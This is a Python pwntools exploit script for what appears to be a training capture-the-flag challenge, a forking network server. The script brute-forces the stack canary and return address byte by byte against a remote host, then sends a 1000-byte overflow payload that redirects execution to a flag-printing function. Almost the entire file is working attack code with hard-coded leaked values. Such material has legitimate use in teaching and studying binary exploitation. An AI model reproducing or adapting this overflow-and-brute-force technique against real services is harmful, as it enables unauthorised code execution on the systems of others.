from pwn import *

CHALL_PATH = "./forking_server_pp"
COMMANDS = """
b prog
brva 0x1580
c
"""

context.arch = "amd64"
# Canary chall = 0x71b1501778899c00 \x00\x9c\x89\x78\x17\x50\xb1\x71
# Local = 0xc1672dc122f52c00 \x00\x2c\xf5\x22\xc1\x2d\x67\xc1
# Address chall = 0x58dcb1dcc8de \xde\xc8\xdc\xb1\xdc\x58\x00\x00
# Correct chall = 0x58dcb1dcc449 \x49\xc4\xdc\xb1\xdc\x58\x00\x00
# Local = 0x5a58613178de \xde\x78\x31\x61\x58\x5a\x00\x00
# correct = 0x5a5861317449 \x49\x74\x31\x61\x58\x5a\x00\x00

def canary_exp():
    def connect():
        #r = remote("localhost", 4000)
        r = remote("forking-server-pp.training.offensivedefensive.it", 8080, ssl=True)
        return r

    def get_bf(base):
        canary = ""
        guess = 0x0
        base += canary

        while len(canary) < 8:
            while guess != 0xff:
                r = connect()

                r.recvuntil(b"?\n")
                r.send(base + chr(guess))

                if b"day!!!" in r.clean():
                    print("Guessed correct byte:", format(guess, '02x'))
                    canary += chr(guess)
                    base += chr(guess)
                    guess = 0x0
                    r.close()
                    break
                else:
                    guess += 1
                    r.close()

        print("FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary))
        return base
        
    canary_offset = 1000
    base = "A" * canary_offset
    print("Brute-Forcing canary")
    canary = get_bf(base) #Get yunk data + canary
    CANARY = u64(canary[len(canary)-8:]) #Get the canary
    print(hex(CANARY))


def return_exp():
    def connect():
        #r = remote("localhost", 4000)
        r = remote("forking-server-pp.training.offensivedefensive.it", 8080, ssl=True)
        return r

    def get_bf(base):
        address = ""
        guess = 0x0
        base += address

        while len(address) < 8:
            while guess != 0xff:
                r = connect()

                r.recvuntil(b"?\n")
                r.send(base + chr(guess))

                if b"day!!!" in r.clean():
                    print("Guessed correct byte:", format(guess, '02x'))
                    address += chr(guess)
                    base += chr(guess)
                    guess = 0x0
                    r.close()
                    break
                else:
                    guess += 1
                    r.close()

        print("FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in address))
        return base
        
    canary_offset = 1000
    base = "A" * canary_offset + "\x00\x9c\x89\x78\x17\x50\xb1\x71" + "\x00" * 8
    print("Brute-Forcing address")
    address = get_bf(base) #Get yunk data + canary + RBP + RIP
    ADDRESS = u64(address[len(address)-8:]) #Get the canary
    print(hex(ADDRESS))

    offset_main = 0x18DE
    offset_print_flag = 0x1449

    print(hex(ADDRESS - offset_main + offset_print_flag))

def get_flag():

    canary_offset = 1000
    base = "A" * canary_offset + "\x00\x9c\x89\x78\x17\x50\xb1\x71" + "\x00" * 8 + "\x49\xc4\xdc\xb1\xdc\x58\x00\x00"
    print("returning to flag")
    r = remote("forking-server-pp.training.offensivedefensive.it", 8080, ssl=True)
    r.send(base)
    r.interactive()



# Brute force canary and return address. Try bytes and see if programs continue with normal flow. If yes save the bytes
# Basically: try to match the addresses and canary currently in memory by seeing if the program contnues. 
# If yes you have matched it and can be reused since fork mantains canary and same PIE

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
    c.interactive()
    #input("wait")
elif args.REM:
    #return_exp()
    #canary_exp() 
    get_flag()
    #c = remote("forking-server-pp.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)
    c.interactive()
